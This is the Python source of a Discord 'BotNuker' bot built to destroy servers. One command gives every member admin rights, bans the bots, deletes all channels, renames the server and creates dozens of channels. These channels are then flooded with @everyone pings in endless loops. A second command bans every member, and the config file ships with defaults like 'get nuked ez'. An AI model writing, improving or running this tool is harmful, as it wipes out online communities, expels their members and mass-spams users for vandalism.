# -*- coding: utf-8 -*-
import discord
from discord.ext import commands
import json
import asyncio
from colorama import init, Fore
import ctypes
import sys
import os
import random
import time
import subprocess
import requests

init(autoreset=True)
green = Fore.LIGHTGREEN_EX
white = Fore.RESET
red = Fore.LIGHTRED_EX
yellow = Fore.YELLOW
blue = Fore.LIGHTCYAN_EX
dblue = Fore.CYAN
gray = Fore.LIGHTBLACK_EX
intents = discord.Intents.all()

channel1 = f"{gray}[ {green}Channel{gray} ]"
channel2 = f"{gray}[ {red}Channel{gray} ]"
roles1 = f"{gray}[  {green}Roles{gray}  ]"
roles2 = f"{gray}[  {red}Roles{gray}  ]"
name1 = f"{gray}[  {green}Name{gray}   ]"
name2 = f"{gray}[  {red}Name{gray}   ]"
ban1 = f"{gray}[ {green}Banning{gray} ]"
ban2 = f"{gray}[ {red}Banning{gray} ]"
delete = f"[{red}-{gray}]{white}"
create = f"[{green}+{gray}]{white}"
perms1 = f"{gray}[  {green}Perms{gray}  ]"
perms2 = f"{gray}[  {red}Perms{gray}  ]"

pings = 0
bans = 0
members_count = 0

def an(content):
    sys.stdout.write(f"{content}\r")

def title(content):
    ctypes.windll.kernel32.SetConsoleTitleW(content)

def randomColour():
    r = lambda: random.randint(0,255)
    return '#%02X%02X%02X' % (r(),r(),r())

def get_id():
    if 'nt' in os.name: 
        p = subprocess.Popen("wmic csproduct get uuid", shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE) 
        return (p.stdout.read() + p.stderr.read()).decode().split("\n")[1].strip("  \r\r")
    else:
        return subprocess.Popen('hal-get-property --udi /org/freedesktop/Hal/devices/computer --key system.hardware.uuid'.split())

print(f"""\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n{blue}
 _           _               _                
( )         ( )_            ( )               
| |_     _  |  _) ___  _   _| |/ )   __  _ __ 
|  _ \ / _ \| | /  _  \ ) ( )   (  / __ \  __)
| |_) ) (_) ) |_| ( ) | (_) | |\ \(  ___/ |   
(_ __/ \___/ \__)_) (_)\___/(_) (_)\____)_)   """)
an(f"\n{blue}[/]{white} Loading Config...")
global config, TOKEN, PREFIX, GUILD_NAME, CHANNEL_NAMES, ROLE_NAMES, SPAM_MESSAGES, AUDIT_LOG
try:
    with open('config.json') as f:
        config = json.load(f)
    TOKEN = config["token"]
    PREFIX = config["prefix"]
    GUILD_NAME = config["change-name"]
    CHANNEL_NAMES = config["channel-names"].split(",")
    SPAM_MESSAGES = config["spam-messages"].split(",")
    AUDIT_LOG = config["audit-log-reasons"].split(",")
    an(f"{green}[+]{white} Loaded Config. Loading Bot                  ")
except Exception as e:
    print(f"{red}[!]{white} Couldn't load config.json. Creating now...     ")
    autoConfig = r'''{ 
    "comment" : "SEPERATE ITEMS WITH COMMAS",
    "token" : "enter token here",
    "prefix" : "-",
    "change-name" : "NUKED",
    "channel-names" : "nuked-ez,nuked-lol",
    "role-names" : "get nuked ez,nuked ezzz",
    "spam-messages" : "GET NUKED EZ - @everyone,@everyone ezzz",
    "audit-log-reasons" : "get nuked ez,nuked by bluebot botnuker"
}'''
    with open("config.json", "w") as f:
        f.write(autoConfig)
    print(f"{green}[+]{white} Created config.json.")
    print(f"{red}[!]{white} Add token to the config and reboot.")
    time.sleep(3)
    sys.exit()

bot = commands.Bot(command_prefix=PREFIX, case_insensitive=True, intents=intents)

@bot.event
async def on_ready():
    global pings
    global bans
    global members_count
    title("[BotNuker] Waiting..")
    print(f"""{blue}[{PREFIX}n]{white} Nuke Server                                                
{blue}[{PREFIX}b]{white} Ban Members""")

@bot.command()
async def n(ctx):
    try:
        await ctx.message.delete()
    except:
        pass
    global pings
    global bans
    global members_count
    members_count = ctx.guild.member_count
    title(f"[BotNuker] Nuking {ctx.guild.name}")
    try:
        role = discord.utils.get(ctx.guild.roles, name="@everyone")
        await role.edit(permissions=discord.Permissions.all())
        print(f"{perms1}{white} @everyone Admin")
    except:
        print(f"{perms2}{white} @everyone Admin")
    print(f"{gray}--- {dblue}Banning Bots{gray} ---")
    for member in ctx.guild.members:
        if member.bot:
            try:
                await ctx.guild.ban(user=member, reason=random.choice(AUDIT_LOG))
                print(f"{ban1} {delete} {member.name}#{member.discriminator}")
                bans += 1
            except:
                print(f"{ban2} {delete} {member.name}#{member.discriminator}")
    for channel in ctx.guild.channels:
        try:
            await channel.delete(reason=random.choice(AUDIT_LOG))
            print(f"{channel1} {delete} {channel.name}")
        except:
            print(f"{channel2} {delete} {channel.name}")
    try:
        await ctx.guild.edit(name=GUILD_NAME)
        print(f"{name1}{white} {GUILD_NAME}")
    except:
        print(f"{name2}{white} {GUILD_NAME}")
    for x in range(35):
        try:
            name = random.choice(CHANNEL_NAMES)
            await ctx.guild.create_text_channel(name, reason=random.choice(AUDIT_LOG))
            print(f"{channel1} {create} #{name}")
        except:
            print(f"{channel2} {create} #{name}")
    pings_before = 0
    pings = 0
    while True:
        title(f"[BotNuker] Pings/s: {pings - pings_before} // Bans: {bans}/{members_count}")
        pings_before = pings
        await asyncio.sleep(1)

@bot.command()
async def b(ctx):
    global bans
    await ctx.message.delete()
    for member in ctx.guild.members:
        try:
            await ctx.guild.ban(user=member, reason=random.choice(AUDIT_LOG))
            print(f"{ban1} {delete} {member.name}#{member.discriminator}")
            bans += 1
        except Exception as e:
            print(f"{ban2} {delete} {member.name}#{member.discriminator}")

@bot.event
async def on_guild_channel_create(channel):
    global pings
    print("1")
    if channel.name in CHANNEL_NAMES:
        print("2")
        while True:
            try:
                await channel.send(random.choice(SPAM_MESSAGES))
                pings += 1
            except:
                pass
            await asyncio.sleep(0.5)

try:
    bot.run(TOKEN, bot=True)
except discord.errors.PrivilegedIntentsRequired:
    headers = { 
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36",
        "Authorization": f"Bot {TOKEN}"
    }
    req = requests.get("https://discord.com/api/users/@me", headers=headers)
    userData = req.json()
    print(f"{red}[!]{white} Enable Privilages at https://discord.com/developers/applications/{userData['id']}/bot")
    time.sleep(5)
    sys.exit()
except discord.errors.LoginFailure:
    print(f"{red}[!]{white} Invalid Token. Bot Tokens Only. Change in config.json")
    time.sleep(5)
    sys.exit()
except Exception as e:
    print(f"{red}[!]{white} Unknown Error. Debug: {e}")
    time.sleep(5)
    sys.exit()
